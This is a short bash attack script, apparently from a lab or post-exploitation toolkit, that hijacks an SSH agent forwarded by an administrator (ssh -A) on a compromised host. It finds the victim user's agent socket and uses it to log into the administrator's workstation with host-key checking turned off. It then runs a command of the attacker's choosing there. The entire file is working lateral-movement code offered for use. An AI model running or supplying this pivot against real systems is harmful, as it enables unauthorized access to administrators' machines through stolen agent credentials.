#!/usr/bin/env bash
# Admin used ssh -A. Hijack forwarded agent → SSH to admin workstation.
# Usage: sudo ./pivot_agent_to_admin.sh <ADMIN_IP> [infected_ssh_port]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib.sh
source "$DIR/lib.sh"

ADMIN_IP="${1:-}"
SSH_SERVER_PORT="${2:-${SSH_SERVER_PORT:-22}}"
export SSH_SERVER_PORT VICTIM_USER="${VICTIM_USER:-legacy}"

[[ -n "$ADMIN_IP" ]] || ADMIN_IP="$(admin_ip_from_ss)"
[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP> [infected_ssh_port]"; exit 1; }

ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_SSH_PORT="${ADMIN_SSH_PORT:-22}"
AUTH_SOCK="$(find_agent_sock)" || {
  echo "[-] No forwarded agent for ${VICTIM_USER} (admin must use ssh -A)"
  exit 1
}

echo "[+] SSH_AUTH_SOCK=${AUTH_SOCK}"
echo "[+] Pivot -> ${ADMIN_USER}@${ADMIN_IP}:${ADMIN_SSH_PORT}"

REMOTE_CMD="${REMOTE_CMD:-id; hostname; whoami}"
runuser -u "$VICTIM_USER" -- env SSH_AUTH_SOCK="$AUTH_SOCK" \
  ssh -o IdentityAgent="$AUTH_SOCK" -o PreferredAuthentications=publickey \
  -o PasswordAuthentication=no -o BatchMode=yes -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -p "$ADMIN_SSH_PORT" \
  "${ADMIN_USER}@${ADMIN_IP}" "bash -lc $(printf '%q' "$REMOTE_CMD")"